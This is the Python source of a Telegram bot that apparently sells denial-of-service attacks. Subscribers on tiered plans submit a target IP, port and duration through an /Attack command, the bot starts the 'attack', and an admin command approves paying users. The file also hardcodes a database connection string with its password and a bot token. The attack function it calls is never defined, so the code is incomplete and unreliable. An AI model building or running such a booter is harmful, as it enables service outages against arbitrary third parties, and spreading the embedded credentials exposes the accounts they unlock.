import os
import telebot
import logging
import asyncio
from pymongo import MongoClient
from datetime import datetime, timedelta
import certifi
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
from threading import Thread
import subprocess
loop = asyncio.get_event_loop()
# Logging configuration
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# MongoDB connection
MONGO_URI = 'mongodb+srv://piroop:piroop@piro.hexrg9w.mongodb.net/?retryWrites=true&w=majority&appName=piro&tlsAllowInvalidCertificates=true'
client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
db = client['zoya']
users_collection = db.users
config_collection = db.config

# Telegram Bot Token
TOKEN = '6406386514:AAFmmpPvGJlsz8SrYsmhTSbWA-h9Tt1aiug'
bot = telebot.TeleBot(TOKEN)

# Constants
FORWARD_CHANNEL_ID = -1002152336686
CHANNEL_ID = -1002152336686
error_channel_id = -1002152336686
REQUEST_INTERVAL = 1
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
running_processes = []

def get_configuration():
    try:
        config = db.config.find_one({"_id": "server_details"})
        if not config:
            raise Exception("Configuration not found in database.")
        return config
    except Exception as e:
        logging.error(f"Failed to retrieve configuration: {e}")
        return {"remote_host": "default_ip"}

def update_configuration_with_ip():
    ip_address = get_external_ip()
    if ip_address:
        config_collection.update_one(
            {"_id": "server_details"},
            {"$set": {"remote_host": ip_address}},
            upsert=True
        )
        logging.info(f"Updated remote_host IP to {ip_address}")
    else:
        logging.error("Failed to update remote_host IP.")

def get_external_ip():
    try:
        result = subprocess.run(['curl', '-s', 'ifconfig.me'], stdout=subprocess.PIPE, check=True)
        ip_address = result.stdout.decode().strip()
        return ip_address
    except subprocess.CalledProcessError as e:
        logging.error(f"Error fetching external IP address: {e}")
        return None

# Retrieve and update configuration
update_configuration_with_ip()
config = get_configuration()
REMOTE_HOST = config.get('remote_host', 'default_ip')
async def start_asyncio_loop():
    while True:
        await asyncio.sleep(REQUEST_INTERVAL)
async def run_attack_command_async(target_ip, target_port, duration):
    await run_attack_command_on_codespace(target_ip, target_port, duration)
    
async def run_command_on_codespace(target_ip, command):
    try:
        process = await asyncio.create_subprocess_shell(
            f"ssh {target_ip} {command}",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        running_processes.append(process)
        stdout, stderr = await process.communicate()
        output = stdout.decode()
        error = stderr.decode()

        if output:
            logging.info(f"Command output: {output}")
        if error:
            logging.error(f"Command error: {error}")

    except Exception as e:
        logging.error(f"Failed to execute command on Codespace: {e}")
    finally:
        if process in running_processes:
            running_processes.remove(process)

async def start_asyncio_loop():
    while True:
        await asyncio.sleep(REQUEST_INTERVAL)

async def run_command_async(target_ip, command):
    await run_command_on_codespace(target_ip, command)

def is_user_admin(user_id, chat_id):
    try:
        return bot.get_chat_member(chat_id, user_id).status in ['administrator', 'creator']
    except Exception as e:
        logging.error(f"Error checking admin status: {e}")
        return False

def check_user_approval(user_id):
    user_data = db.users.find_one({"user_id": user_id})
    if user_data and user_data['plan'] > 0:
        return True
    return False

def send_not_approved_message(chat_id):
    bot.send_message(chat_id, "*YOU ARE NOT APPROVED*", parse_mode='Markdown')

@bot.message_handler(commands=['approve', 'disapprove'])
def approve_or_disapprove_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    is_admin = is_user_admin(user_id, CHANNEL_ID)
    cmd_parts = message.text.split()

    if not is_admin:
        bot.send_message(chat_id, "*You are not authorized to use this command*", parse_mode='Markdown')
        return

    if len(cmd_parts) < 2:
        bot.send_message(chat_id, "*Invalid command format. Use /approve <user_id> <plan> <days> or /disapprove <user_id>.*", parse_mode='Markdown')
        return

    action = cmd_parts[0]
    target_user_id = int(cmd_parts[1])
    plan = int(cmd_parts[2]) if len(cmd_parts) >= 3 else 0
    days = int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0

    if action == '/approve':
        if plan == 1:  # Instant Plan 🧡
            if users_collection.count_documents({"plan": 1}) >= 99:
                bot.send_message(chat_id, "*Approval failed: Instant Plan 🧡 limit reached (99 users).*", parse_mode='Markdown')
                return
        elif plan == 2:  # Instant++ Plan 💥
            if users_collection.count_documents({"plan": 2}) >= 499:
                bot.send_message(chat_id, "*Approval failed: Instant++ Plan 💥 limit reached (499 users).*", parse_mode='Markdown')
                return

        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else datetime.now().date().isoformat()
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": plan, "valid_until": valid_until, "access_count": 0}},
            upsert=True
        )
        msg_text = f"*User {target_user_id} approved with plan {plan} for {days} days.*"
    else:  # disapprove
        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"plan": 0, "valid_until": "", "access_count": 0}},
            upsert=True
        )
        msg_text = f"*User {target_user_id} disapproved and reverted to free.*"

    bot.send_message(chat_id, msg_text, parse_mode='Markdown')
    bot.send_message(CHANNEL_ID, msg_text, parse_mode='Markdown')

@bot.message_handler(commands=['Attack'])
def attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if not check_user_approval(user_id):
        send_not_approved_message(chat_id)
        return

    try:
        bot.send_message(chat_id, "*Enter the target IP, port, and duration (in seconds) separated by spaces.*", parse_mode='Markdown')
        bot.register_next_step_handler(message, process_attack_command)
    except Exception as e:
        logging.error(f"Error in attack command: {e}")

def process_attack_command(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, "*Invalid command format. Please use: Instant++ plan target_ip target_port duration*", parse_mode='Markdown')
            return
        target_ip, target_port, duration = args[0], int(args[1]), args[2]

        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"*Port {target_port} is blocked. Please use a different port.*", parse_mode='Markdown')
            return

        asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
        bot.send_message(message.chat.id, f"*Attack started 💥\n\nHost: {target_ip}\nPort: {target_port}\nTime: {duration} seconds*", parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error in processing attack command: {e}")
def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_until_complete(start_asyncio_loop())
    
def start_asyncio_thread():
    asyncio.run(start_asyncio_loop())

def create_main_keyboard():
    keyboard = ReplyKeyboardMarkup(resize_keyboard=True)
    all_commands_button = KeyboardButton('All Commands')
    keyboard.add(all_commands_button)
    return keyboard

def send_all_commands(message):
    all_commands_text = ("*Available Commands:*\n"
                         "/approve <user_id> <plan> <days> - Approve a user\n"
                         "/disapprove <user_id> - Disapprove a user\n"
                         "/Attack - Start an attack\n")
    bot.send_message(message.chat.id, all_commands_text, parse_mode='Markdown')

@bot.message_handler(commands=['start'])
def start_command(message):
    bot.send_message(message.chat.id, "*Welcome to the bot! Use /start to begin.*", parse_mode='Markdown', reply_markup=create_main_keyboard())

@bot.message_handler(func=lambda message: message.text == 'All Commands')
def handle_all_commands(message):
    send_all_commands(message)

# Start threads
asyncio_thread = Thread(target=start_asyncio_thread)
asyncio_thread.start()

# Polling bot
bot.polling(none_stop=True)
